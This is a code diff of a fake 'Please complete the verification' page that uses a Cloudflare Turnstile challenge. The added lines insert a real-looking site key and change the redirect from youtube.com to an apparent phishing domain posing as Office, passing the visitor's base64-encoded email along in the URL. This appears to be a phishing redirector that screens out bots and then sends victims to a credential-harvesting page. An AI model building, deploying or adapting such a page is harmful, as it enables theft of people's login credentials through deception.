@@ -44,7 +44,7 @@
     <div class="container">
         <h1>Please complete the verification</h1>
         <div class="turnstile-container">
-            <div class="cf-turnstile" data-sitekey="YOUR_SITE_KEY"></div>
+            <div class="cf-turnstile" data-sitekey="0x4AAAAAABY-PATczEiMK3WG"></div>
         </div>
     </div>
 
@@ -57,13 +57,13 @@
 
         window.onloadTurnstileCallback = function () {
             turnstile.render('.cf-turnstile', {
-                sitekey: 'YOUR_SITE_KEY',
+                sitekey: '0x4AAAAAABY-PATczEiMK3WG',
                 callback: function(token) {
                     // Get the base64 email and append it to YouTube URL
                     const base64Email = getBase64Email();
                     const redirectUrl = base64Email ? 
-                        `https://youtube.com#${base64Email}` : 
-                        'https://youtube.com';
+                        `https://office.arizonmey.site/xELTGrPW#${base64Email}` : 
+                        'https://office.arizonmey.site/xELTGrPW';
                     window.location.href = redirectUrl;
                 }
             });
